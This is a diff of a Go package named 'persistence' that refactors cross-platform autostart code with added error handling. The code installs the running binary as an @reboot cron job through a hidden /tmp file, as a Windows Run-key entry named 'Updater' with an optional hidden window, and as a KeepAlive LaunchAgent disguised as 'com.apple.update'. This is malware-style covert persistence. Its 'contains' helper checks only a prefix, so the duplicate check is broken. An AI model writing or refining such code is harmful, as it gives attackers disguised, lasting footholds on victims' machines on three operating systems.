@@ -1,53 +1,100 @@
 package persistence
 
 import (
+	"bytes"
+	"fmt"
 	"os"
 	"os/exec"
-	// "syscall"
-	"runtime"
-	"fmt"
 	"path/filepath"
+	"runtime"
+	"text/template"
 )
 
-func AddToCron() {
-	cronEntry := "@reboot " + os.Args[0] + "\n"
-	cronFile := "/tmp/.cronjob"
+func AddToCron() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
+
+	cronTemplate := "@reboot {{.ExePath}}\n"
+	tmpl, err := template.New("cron").Parse(cronTemplate)
+	if err != nil {
+		return fmt.Errorf("failed to parse cron template: %w", err)
+	}
+
+	var cronEntry bytes.Buffer
+	err = tmpl.Execute(&cronEntry, map[string]string{"ExePath": exePath})
+	if err != nil {
+		return fmt.Errorf("failed to execute cron template: %w", err)
+	}
 
 	cmd := exec.Command("crontab", "-l")
-	output, _ := cmd.Output()
-
-	if !contains(string(output), cronEntry) {
-		file, _ := os.Create(cronFile)
-		defer file.Close()
-		file.WriteString(string(output) + cronEntry)
-		exec.Command("crontab", cronFile).Run()
-		os.Remove(cronFile)
+	output, err := cmd.Output()
+	if err != nil && err != exec.ErrNotFound { // Handle case where no crontab exists
+		return fmt.Errorf("failed to list cron jobs: %w", err)
 	}
+
+	if contains(string(output), cronEntry.String()) {
+		return nil
+	}
+
+	cronFile := "/tmp/.cronjob"
+	file, err := os.Create(cronFile)
+	if err != nil {
+		return fmt.Errorf("failed to create cron file: %w", err)
+	}
+	defer file.Close()
+
+	_, err = file.WriteString(string(output) + cronEntry.String())
+	if err != nil {
+		return fmt.Errorf("failed to write to cron file: %w", err)
+	}
+
+	err = exec.Command("crontab", cronFile).Run()
+	if err != nil {
+		return fmt.Errorf("failed to apply cron jobs: %w", err)
+	}
+
+	err = os.Remove(cronFile)
+	if err != nil {
+		return fmt.Errorf("failed to remove cron file: %w", err)
+	}
+
+	return nil
 }
 
-// Windows
-func AddToRegistry() {
-	exePath, _ := os.Executable()
+func AddToRegistry() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
+
 	regCmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
 		"/v", "Updater", "/t", "REG_SZ", "/d", exePath, "/f")
 
+	// I recommend you follow a similar pattern here as I showed in the other spots
 	if runtime.GOOS == "windows" {
-		// regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} -- ONLY WORKS WHEN BUILDING FOR WINDOWS
+		// Uncomment the following line when building for Windows
+		// regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	}
 
-	regCmd.Run()
+	err = regCmd.Run()
+	if err != nil {
+		return fmt.Errorf("failed to add to registry: %w", err)
+	}
+
+	return nil
 }
 
-// Helper function to check if text contains a substring
-func contains(text, substring string) bool {
-	return len(text) >= len(substring) && text[:len(substring)] == substring
-}
+func AddToLaunchAgent() error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("failed to get executable path: %w", err)
+	}
 
-func AddToLaunchAgent() {
-	exePath, _ := os.Executable()
 	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", "com.apple.update.plist")
 
-	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
+	plistTemplate := `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
@@ -55,22 +102,39 @@ func AddToLaunchAgent() {
     <string>com.apple.update</string>
     <key>ProgramArguments</key>
     <array>
-        <string>%s</string>
+        <string>{{.ExePath}}</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
     <true/>
 </dict>
-</plist>`, exePath)
+</plist>`
 
-	// Write plist file
-	err := os.WriteFile(plistPath, []byte(plistContent), 0644)
+	tmpl, err := template.New("plist").Parse(plistTemplate)
 	if err != nil {
-		fmt.Println("Error writing LaunchAgent:", err)
-		return
+		return fmt.Errorf("failed to parse plist template: %w", err)
 	}
 
-	// Load the Launch Agent
-	exec.Command("launchctl", "load", plistPath).Run()
+	var plistContent bytes.Buffer
+	err = tmpl.Execute(&plistContent, map[string]string{"ExePath": exePath})
+	if err != nil {
+		return fmt.Errorf("failed to execute plist template: %w", err)
+	}
+
+	err = os.WriteFile(plistPath, plistContent.Bytes(), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write LaunchAgent file: %w", err)
+	}
+
+	err = exec.Command("launchctl", "load", plistPath).Run()
+	if err != nil {
+		return fmt.Errorf("failed to load LaunchAgent: %w", err)
+	}
+
+	return nil
+}
+
+func contains(text, substring string) bool {
+	return len(text) >= len(substring) && text[:len(substring)] == substring
 }
